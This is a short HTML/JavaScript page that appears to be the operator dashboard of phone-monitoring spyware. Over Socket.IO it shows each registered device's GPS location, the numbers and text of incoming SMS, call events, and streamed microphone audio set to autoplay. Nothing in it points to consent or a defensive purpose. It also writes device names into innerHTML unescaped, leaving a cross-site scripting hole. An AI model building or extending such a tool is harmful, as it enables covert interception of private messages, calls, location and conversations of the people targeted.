<script src="/socket.io/socket.io.js"></script>
<script>
const socket = io();

// Keep track of devices
const devices = {};

socket.on("device-registered", (data) => {
    const { deviceId, deviceName } = data;

    if (!devices[deviceId]) {
        // create new section for this device
        const div = document.createElement("div");
        div.id = "device-" + deviceId;
        div.innerHTML = `
            <h3>${deviceName} (${deviceId})</h3>
            <p id="loc-${deviceId}">Location: waiting...</p>
            <audio id="audio-${deviceId}" controls autoplay></audio>
            <p id="sms-${deviceId}">SMS: none</p>
            <p id="call-${deviceId}">Call: none</p>
            <hr/>
        `;
        document.body.appendChild(div);
        devices[deviceId] = true;
    }
});

socket.on("location-update", (data) => {
    const { deviceId, lat, lng } = data;
    document.getElementById("loc-" + deviceId).innerText =
        `Location: ${lat}, ${lng}`;
});

socket.on("sms-received", (data) => {
    const { deviceId, number, body } = data;
    document.getElementById("sms-" + deviceId).innerText =
        `SMS from ${number}: ${body}`;
});

socket.on("call-event", (data) => {
    const { deviceId, number, state } = data;
    document.getElementById("call-" + deviceId).innerText =
        `Call ${state}: ${number}`;
});

socket.on("audio-chunk", (data) => {
    const { deviceId, chunk } = data;
    const audio = document.getElementById("audio-" + deviceId);

    if (audio) {
        const byteCharacters = atob(chunk);
        const byteNumbers = new Array(byteCharacters.length);
        for (let i = 0; i < byteCharacters.length; i++) {
            byteNumbers[i] = byteCharacters.charCodeAt(i);
        }
        const byteArray = new Uint8Array(byteNumbers);
        const blob = new Blob([byteArray], { type: "audio/wav" });
        audio.src = URL.createObjectURL(blob);
    }
});
</script>
